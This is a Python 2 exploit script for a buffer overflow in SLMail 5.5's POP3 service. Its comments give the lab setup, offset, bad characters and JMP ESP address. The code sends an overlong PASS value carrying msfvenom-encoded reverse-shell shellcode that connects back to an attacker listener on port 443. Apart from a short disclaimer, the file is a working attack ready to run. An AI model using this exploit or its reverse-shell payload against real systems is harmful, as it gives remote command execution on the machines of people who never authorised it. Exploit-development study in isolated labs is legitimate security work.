#!/usr/bin/python
#
# July 2017 | github.com/rafaveira3
#
# Exploit SLMail - Buffer Overflow
#
# How I tested it:
# - 1 Kali attacking machine and 1 Windows XP (Metasploitable will do) in the same local host network using virtualbox.
# - Download and install vulnerable service on Windows XP (WARNING! THIS IS A VULNERABLE SERVICE)
#  https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
# - Intallation Guide: Next, Next, Next, ... ,  Next, Finish
# - pattern_create.rb and pattern_offset.rb = 2606
# - Bachars = \x00\x0a\x0d
# - Return Address found at 5F4A358F (JMP ESP)
# - Generated the payload using msfvenom
#
# PoC:
# terminal 1
#    root@kali: python exploit-smail.py
# terminal 2
#    root@kali:	nc -nlvp 443
#    listening on [any] 443 ...
#    connect to [10.10.0.20] from (UNKNOWN) [10.10.0.21] 1035

#    (C) Copyright 1985-2001 Microsoft Corp.
#
#    C:\Arquivos de programas\SLmail\System>
#
# Disclaimer: PLEASE! This is for research purposes only, and should only be used on authorized systems.
# Accessing a computer system or network without authorization or explicit permission is illegal.
#
#

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

jmpESP = "\x8f\x35\x4a\x5f"
nop = "\x90"*16

#
# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.0.20 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
# Payload size: 351 bytes

shellcode = ("\xda\xcb\xd9\x74\x24\xf4\x5e\x33\xc9\xb8\xb7\xb0\x24\x11\xb1"
"\x53\x31\x46\x17\x83\xee\xfc\x03\xf1\xa3\xc6\xe4\x01\x2b\x84"
"\x07\xf9\xac\xe9\x8e\x1c\x9d\x29\xf4\x55\x8e\x99\x7e\x3b\x23"
"\x51\xd2\xaf\xb0\x17\xfb\xc0\x71\x9d\xdd\xef\x82\x8e\x1e\x6e"
"\x01\xcd\x72\x50\x38\x1e\x87\x91\x7d\x43\x6a\xc3\xd6\x0f\xd9"
"\xf3\x53\x45\xe2\x78\x2f\x4b\x62\x9d\xf8\x6a\x43\x30\x72\x35"
"\x43\xb3\x57\x4d\xca\xab\xb4\x68\x84\x40\x0e\x06\x17\x80\x5e"
"\xe7\xb4\xed\x6e\x1a\xc4\x2a\x48\xc5\xb3\x42\xaa\x78\xc4\x91"
"\xd0\xa6\x41\x01\x72\x2c\xf1\xed\x82\xe1\x64\x66\x88\x4e\xe2"
"\x20\x8d\x51\x27\x5b\xa9\xda\xc6\x8b\x3b\x98\xec\x0f\x67\x7a"
"\x8c\x16\xcd\x2d\xb1\x48\xae\x92\x17\x03\x43\xc6\x25\x4e\x0c"
"\x2b\x04\x70\xcc\x23\x1f\x03\xfe\xec\x8b\x8b\xb2\x65\x12\x4c"
"\xb4\x5f\xe2\xc2\x4b\x60\x13\xcb\x8f\x34\x43\x63\x39\x35\x08"
"\x73\xc6\xe0\xa5\x7b\x61\x5b\xd8\x86\xd1\x0b\x5c\x28\xba\x41"
"\x53\x17\xda\x69\xb9\x30\x73\x94\x42\x3f\x3f\x11\xa4\x55\x2f"
"\x74\x7e\xc1\x8d\xa3\xb7\x76\xed\x81\xef\x10\xa6\xc3\x28\x1f"
"\x37\xc6\x1e\xb7\xbc\x05\x9b\xa6\xc2\x03\x8b\xbf\x55\xd9\x5a"
"\xf2\xc4\xde\x76\x64\x64\x4c\x1d\x74\xe3\x6d\x8a\x23\xa4\x40"
"\xc3\xa1\x58\xfa\x7d\xd7\xa0\x9a\x46\x53\x7f\x5f\x48\x5a\xf2"
"\xdb\x6e\x4c\xca\xe4\x2a\x38\x82\xb2\xe4\x96\x64\x6d\x47\x40"
"\x3f\xc2\x01\x04\xc6\x28\x92\x52\xc7\x64\x64\xba\x76\xd1\x31"
"\xc5\xb7\xb5\xb5\xbe\xa5\x25\x39\x15\x6e\x55\x70\x37\xc7\xfe"
"\xdd\xa2\x55\x63\xde\x19\x99\x9a\x5d\xab\x62\x59\x7d\xde\x67"
"\x25\x39\x33\x1a\x36\xac\x33\x89\x37\xe5")

buffer = "A"*2606 + jmpESP + nop + shellcode + "C"*(3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('10.0.2.5',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
